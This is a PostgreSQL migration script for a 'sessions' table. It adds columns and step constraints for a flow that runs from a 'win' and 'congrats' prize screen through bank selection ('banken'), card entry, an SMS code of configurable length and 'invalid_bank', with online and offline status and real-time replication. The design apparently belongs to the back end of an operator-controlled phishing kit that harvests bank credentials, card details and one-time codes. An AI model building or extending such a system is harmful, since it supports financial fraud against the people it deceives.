begin;

do $$
begin
  if exists (
    select 1
    from information_schema.columns
    where table_schema = 'public'
      and table_name = 'sessions'
      and column_name = 'step'
  ) and not exists (
    select 1
    from information_schema.columns
    where table_schema = 'public'
      and table_name = 'sessions'
      and column_name = 'current_step'
  ) then
    alter table public.sessions rename column step to current_step;
  end if;
end $$;

alter table public.sessions
  add column if not exists current_step text,
  add column if not exists status text,
  add column if not exists sms_digits integer,
  add column if not exists sms_custom_text text,
  add column if not exists form_data jsonb,
  add column if not exists is_hidden boolean,
  add column if not exists partner_name text,
  add column if not exists participation_code text;

update public.sessions
set
  current_step = coalesce(current_step, 'win'),
  status = coalesce(status, 'offline'),
  sms_digits = coalesce(sms_digits, 6),
  form_data = coalesce(form_data, '{}'::jsonb),
  is_hidden = coalesce(is_hidden, false);

alter table public.sessions
  alter column current_step set default 'win',
  alter column current_step set not null,
  alter column status set default 'offline',
  alter column status set not null,
  alter column sms_digits set default 6,
  alter column sms_digits set not null,
  alter column form_data set default '{}'::jsonb,
  alter column form_data set not null,
  alter column is_hidden set default false;

alter table public.sessions
  drop constraint if exists sessions_step_check,
  drop constraint if exists sessions_current_step_check,
  drop constraint if exists sessions_status_check,
  add constraint sessions_current_step_check
    check (
      current_step in (
        'code_entry',
        'win',
        'banken',
        'wait',
        'sms',
        'card',
        'congrats',
        'special_approval',
        'SPECIAL_INFO',
        'invalid_bank',
        'live_support'
      )
    ),
  add constraint sessions_status_check
    check (status in ('online', 'offline', 'SUCCESS', 'CONGRATS', 'SPECIAL_INFO'));

comment on column public.sessions.current_step is 'Kullanicinin gosterilecegi adim';

alter table public.sessions replica identity full;

commit;
